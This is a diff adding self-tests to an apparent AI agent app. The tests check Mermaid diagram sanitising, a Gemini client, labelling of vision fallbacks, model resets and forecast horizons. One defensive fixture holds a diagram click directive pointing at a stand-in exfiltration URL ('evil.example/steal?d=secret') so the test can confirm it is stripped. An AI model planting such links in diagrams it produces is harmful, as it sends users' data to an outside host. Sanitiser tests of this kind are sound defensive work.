@@ -205,6 +205,108 @@ function assert(cond, message) {
     return out.output;
   });
 
+  /* ------------------------------ diagrams ----------------------------- */
+
+  const diagram = require(path.join(compiled, "agent/diagram.js"));
+
+  await checkAsync("diagram: tool renders a flowchart into the UI layer", async () => {
+    const out = await call("diagram", {
+      title: "Alert escalation",
+      source: 'flowchart TD\n  A["Case reported"] --> B{"z-score > 2?"}\n  B -- yes --> C["Investigate"]\n  B -- no --> D["Routine reporting"]',
+    });
+    assert(out.ok, out.output);
+    const event = out.events.find((e) => e.type === "diagram");
+    assert(event, "no diagram event emitted");
+    assert(/flowchart TD/.test(event.diagram.source), "source missing from payload");
+    assert(event.diagram.kind === "Flowchart", `kind is ${event.diagram.kind}`);
+    return `${event.diagram.kind}, ${event.diagram.source.split("\n").length} lines`;
+  });
+
+  await checkAsync("diagram: every supported type is detected from its header", async () => {
+    const seen = [];
+    for (const src of [
+      "sequenceDiagram\n  A->>B: hello",
+      "erDiagram\n  REGION ||--o{ DISTRICT : contains",
+      "gantt\n  title Plan\n  section Build\n  Draft :a1, 2026-01-01, 3d",
+      "mindmap\n  root((One Health))\n    Human\n    Animal",
+      "pie title Signals\n  \"Malaria\" : 42",
+      "stateDiagram-v2\n  [*] --> Watch",
+      "classDiagram\n  class Region",
+      "timeline\n  title Timeline\n  2026 : Phase 2",
+      "journey\n  title Journey\n  section Start\n    Report: 5: Nurse",
+      "gitGraph\n  commit",
+      "quadrantChart\n  title Risk\n  x-axis Low --> High",
+    ]) {
+      const prepared = diagram.prepareDiagram(src);
+      assert(prepared.ok, `${src.split("\n")[0]} rejected: ${prepared.error}`);
+      seen.push(prepared.kind);
+    }
+    assert(new Set(seen).size === seen.length, `kinds collapsed: ${seen.join(", ")}`);
+    return seen.join(", ");
+  });
+
+  await checkAsync("diagram: the reserved word `end` is repaired, not rejected", async () => {
+    const prepared = diagram.prepareDiagram("flowchart TD\n  A[Start] --> end\n  end --> B[Done]");
+    assert(prepared.ok, prepared.error);
+    assert(!/(^|\s)end(\s|$)/.test(prepared.source.split("\n")[1]), "bare end survived");
+    assert(prepared.repairs.some((r) => /end/.test(r)), `no repair reported: ${prepared.repairs}`);
+    return prepared.repairs[0];
+  });
+
+  await checkAsync("diagram: click directives and init themes are stripped", async () => {
+    const prepared = diagram.prepareDiagram(
+      '%%{ init: { "themeVariables": { "primaryColor": "#fff" } } }%%\nflowchart TD\n  L["Login"]\n  click L "https://evil.example/steal?d=secret"\n  L --> B[Next]',
+    );
+    assert(prepared.ok, prepared.error);
+    assert(!/click\s/i.test(prepared.source), "click directive survived");
+    assert(!/evil\.example/.test(prepared.source), "exfiltration URL survived");
+    assert(!/%%\s*\{/.test(prepared.source), "init directive survived");
+    assert(prepared.repairs.length >= 2, `expected >=2 repairs, got ${prepared.repairs.length}`);
+    return prepared.repairs.join(" | ");
+  });
+
+  await checkAsync("diagram: garbage is rejected with an actionable message", async () => {
+    const bad = await call("diagram", { source: "here is a nice picture of a flowchart" });
+    assert(!bad.ok, "nonsense should be rejected");
+    assert(/Unrecognised diagram type/.test(bad.output), bad.output);
+    assert(/flowchart/.test(bad.output), "must list valid types");
+    const empty = await call("diagram", { source: "   " });
+    assert(!empty.ok && /empty/i.test(empty.output), empty.output);
+    const unbalanced = diagram.prepareDiagram('flowchart TD\n  A["Unclosed --> B');
+    assert(!unbalanced.ok, "unbalanced quotes must fail");
+    return bad.output.split("\n")[0].slice(0, 70);
+  });
+
+  await checkAsync("diagram: normaliser is idempotent and never grows the source", async () => {
+    const src = 'flowchart TD\n  A["Cholera cases (weekly)"] --> B{"Above threshold?"}';
+    const once = diagram.prepareDiagram(src);
+    const twice = diagram.prepareDiagram(once.source);
+    assert(twice.ok, twice.error);
+    assert(twice.source === once.source, "second pass changed the source");
+    assert(twice.repairs.length === 0, `repairs repeated: ${twice.repairs}`);
+    return `stable at ${once.source.length} chars`;
+  });
+
+  check("diagram: sandbox speaks mermaid, csv and markdown", () => {
+    const spec = tools.TOOL_MAP.get("sandbox_exec").parameters.properties.language;
+    for (const lang of ["mermaid", "csv", "markdown", "javascript", "html", "python"]) {
+      assert(spec.enum.includes(lang), `sandbox_exec missing ${lang}`);
+    }
+    const frame = fs.readFileSync(path.join(ROOT, "components/agent/SandboxFrame.tsx"), "utf8");
+    assert(/securityLevel: "strict"/.test(frame), "sandbox mermaid preview is not locked down");
+    return spec.enum.join(", ");
+  });
+
+  check("diagram: the chat renderer draws mermaid fences instead of showing them", () => {
+    const md = fs.readFileSync(path.join(ROOT, "components/Markdown.tsx"), "utf8");
+    assert(/Diagram/.test(md) && /mermaid/.test(md), "Markdown does not route mermaid to the renderer");
+    const component = fs.readFileSync(path.join(ROOT, "components/agent/Diagram.tsx"), "utf8");
+    assert(/securityLevel: "strict"/.test(component), "renderer is not locked down");
+    assert(/htmlLabels: false/.test(component), "htmlLabels must be off for PNG export");
+    assert(/import\("mermaid"\)/.test(component), "mermaid must be code-split, not in the first paint");
+    return "strict security, htmlLabels off, dynamic import";
+  });
+
   await checkAsync("tools: workspace file round-trip through the store", async () => {
     const name = `selftest-${Date.now()}.html`;
     const created = await call("create_file", { name, content: "<h1>hi</h1>" });
@@ -308,6 +410,138 @@ function assert(cond, message) {
     const out = await call("vision_read", { question: "what is in the photo?" });
     assert(!out.ok && /No attachments/.test(out.output), out.output);
     return out.output.slice(0, 50);
+  });
+
+  const gemini = require(path.join(compiled, "agent/gemini.js"));
+
+  check("gemini: client exists, is key-gated and refuses an OpenRouter key", () => {
+    assert(typeof gemini.geminiComplete === "function", "geminiComplete missing");
+    assert(typeof gemini.geminiConfigured === "function", "geminiConfigured missing");
+    assert(gemini.GEMINI_MODEL_CHAIN.length > 1, "no model chain");
+    assert(gemini.geminiConfigured() === false, "should be unconfigured without a key");
+    const src = fs.readFileSync(path.join(ROOT, "lib/env.ts"), "utf8");
+    assert(/sk-or-/.test(src) && /geminiKey/.test(src), "geminiKey must reject an OpenRouter key");
+    return `${gemini.GEMINI_MODEL_CHAIN.length} models; sk-or guard intact`;
+  });
+
+  check("gemini: quota and auth errors are told apart", () => {
+    assert(gemini.isGeminiQuotaError(429, "Resource exhausted"), "429 must read as quota");
+    assert(gemini.isGeminiQuotaError(0, "You exceeded your current quota"), "quota text missed");
+    assert(!gemini.isGeminiQuotaError(401, "API key not valid"), "auth misread as quota");
+    assert(gemini.isGeminiAuthError(403, "API key not valid"), "403 must read as auth");
+    assert(!gemini.isGeminiAuthError(429, "quota"), "quota misread as auth");
+    return "quota -> retry next model; auth -> stop";
+  });
+
+  await checkAsync("gemini: no key is a clean failure, never a silent empty answer", async () => {
+    let threw = false;
+    try {
+      await gemini.geminiComplete({ messages: [{ role: "user", content: "hi" }] });
+    } catch (err) {
+      threw = true;
+      assert(/GEMINI_API_KEY is not set/.test(err.message), err.message);
+    }
+    assert(threw, "geminiComplete resolved with no key configured");
+    return "throws with a named key, does not return blank text";
+  });
+
+  check("gemini: message conversion is safe for the shapes the agent actually sends", () => {
+    const src = fs.readFileSync(path.join(ROOT, "lib/agent/gemini.ts"), "utf8");
+    assert(/systemInstruction/.test(src), "system prompt is not mapped");
+    assert(/contents\[0\]\.role === "model"/.test(src), "a leading model turn is not dropped");
+    assert(/last\.role === role/.test(src), "consecutive same-role turns are not merged");
+    assert(/dataUrlToInline/.test(src), "attachments are not converted to inlineData");
+    // Strip comments first: the word appears in a doc comment explaining what
+    // this client deliberately does NOT do, which is not a request for images.
+    const code = src.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
+    assert(!/responseModalities/.test(code), "text client must not request image output");
+    assert(/maxOutputTokens/.test(code) && /temperature/.test(code), "generationConfig incomplete");
+    return "system/role/inlineData handled; no image modality in code";
+  });
+
+  check("vision: runs on Gemini, and says so when it does not", () => {
+    const src = fs.readFileSync(path.join(ROOT, "lib/agent/tools.ts"), "utf8");
+    assert(/if \(geminiConfigured\(\)\)/.test(src), "vision_read is not Gemini-first");
+    assert(/geminiComplete\(\{ messages/.test(src), "vision_read does not call Gemini");
+    assert(/openrouter-fallback/.test(src), "no explicit fallback labelling");
+    assert(/Gemini" : "OpenRouter fallback/.test(src), "the answer does not name its provider");
+    return "Gemini first; OpenRouter only with no key, and labelled";
+  });
+
+  check("research: decompose and synthesis both run on Gemini", () => {
+    const src = fs.readFileSync(path.join(ROOT, "lib/agent/deep-research.ts"), "utf8");
+    const calls = (src.match(/geminiComplete\(/g) || []).length;
+    assert(calls >= 2, `expected decompose + synthesis on Gemini, found ${calls} call(s)`);
+    assert(/Synthesised by \$\{engine\}/.test(src), "the brief does not name its engine");
+    assert(/OpenRouter fallback/.test(src), "no labelled fallback");
+    return `${calls} Gemini calls; engine named in the brief`;
+  });
+
+  check("models: a pinned model is singular, then auto-resets on exhausted credit", () => {
+    const src = fs.readFileSync(path.join(ROOT, "lib/agent/run.ts"), "utf8");
+    assert(/pinnedModel/.test(src), "no pinned-model tracking");
+    assert(/models: \[pinnedModel\]/.test(src), "a pinned model is not used on its own");
+    assert(/isCreditError\(status, message\)/.test(src), "credit exhaustion is not detected");
+    assert(/"model_reset"/.test(src), "the browser is never told about the reset");
+    assert(/pinnedModel = ""/.test(src), "the pin is not cleared for later steps");
+    // The Auto chain itself must be untouched: unpinned turns still pass undefined.
+    assert(/models: undefined/.test(src), "the Auto chain call changed");
+    const client = fs.readFileSync(path.join(ROOT, "components/agent/useAgent.ts"), "utf8");
+    assert(/case "model_reset":/.test(client), "client does not handle model_reset");
+    const page = fs.readFileSync(path.join(ROOT, "app/agent/page.tsx"), "utf8");
+    assert(/patch\(\{ model: "" \}\)/.test(page), "the dropdown is not returned to Auto");
+    return "pin honoured -> credit out -> Auto chain + dropdown reset";
+  });
+
+  await checkAsync("vision: a blind answer can never pose as a reading", async () => {
+    const src = fs.readFileSync(path.join(ROOT, "lib/openrouter.ts"), "utf8");
+    assert(/degraded\??:/.test(src), "ORResult has no degraded flag");
+    assert(/have NOT seen the image or document/i.test(src), "fallback does not tell the model it is blind");
+    const toolsSrc = fs.readFileSync(path.join(ROOT, "lib/agent/tools.ts"), "utf8");
+    assert(/if \(result\.degraded\)/.test(toolsSrc), "vision_read ignores the degraded flag");
+    assert(/VISION FAILED/.test(toolsSrc), "vision_read does not fail loudly");
+    // The real executor, with no attachments, must still refuse outright.
+    const out = await call("vision_read", { question: "what does the photo show?" });
+    assert(!out.ok, "vision_read answered with nothing attached");
+    return "degraded flag wired end to end; empty-attachment refusal holds";
+  });
+
+  await checkAsync("chat: multi-step turns persist every segment they streamed", async () => {
+    const src = fs.readFileSync(path.join(ROOT, "lib/agent/run.ts"), "utf8");
+    assert(!/finalText = streamed;/.test(src), "finalText is still overwritten, not accumulated");
+    assert(/finalText = finalText \?/.test(src), "no accumulation across tool steps");
+    assert(/seedText/.test(src), "resume does not carry prior text back");
+    const route = fs.readFileSync(path.join(ROOT, "app/api/agent/route.ts"), "utf8");
+    const client = fs.readFileSync(path.join(ROOT, "components/agent/useAgent.ts"), "utf8");
+    assert(/priorText/.test(route) && /priorText/.test(client), "priorText is not carried through the round trip");
+    return "accumulate + seedText + priorText round trip";
+  });
+
+  await checkAsync("forecast: the horizon reaches 26 weeks, not 4", async () => {
+    const long = await call("ghana_forecast", { disease: "malaria", region: "national", horizon: 26 });
+    assert(long.ok, long.output);
+    const chart = long.events.find((e) => e.type === "chart");
+    const fwd = chart.chart.x.length - 8;
+    assert(fwd >= 26, `only ${fwd} forward points for horizon 26`);
+    const clamped = await call("ghana_forecast", { disease: "cholera", region: "national", horizon: 999 });
+    assert(clamped.ok, clamped.output);
+    const cChart = clamped.events.find((e) => e.type === "chart");
+    assert(cChart.chart.x.length - 8 <= 26, "horizon above 26 was not clamped");
+    // A longer horizon must widen the interval, or it is not honest.
+    const short = await call("ghana_forecast", { disease: "malaria", region: "national", horizon: 2 });
+    const sChart = short.events.find((e) => e.type === "chart");
+    assert(sChart.chart.x.length - 8 >= 2, "short horizon returned too few points");
+    return `26-week projection = ${fwd} forward points; 999 clamped`;
+  });
+
+  await checkAsync("research: citation numbering cannot point past the source list", async () => {
+    const src = fs.readFileSync(path.join(ROOT, "lib/agent/deep-research.ts"), "utf8");
+    assert(/MAX_CITED/.test(src), "no single citation cap");
+    assert(!/hits\s*\n?\s*\.slice\(0, 14\)/.test(src), "prompt still offers 14 sources for 12 chips");
+    assert(!/citations: hits\.slice\(0, 12\)/.test(src), "chips still sliced separately from the prompt");
+    assert(/const cited = hits\.slice\(0, MAX_CITED\)/.test(src), "one numbered list is not shared");
+    assert(/byQuery/.test(src), "sources are not interleaved across sub-queries");
+    return "one numbered list, interleaved reads";
   });
 
   await checkAsync("tools: web layer degrades instead of throwing", async () => {
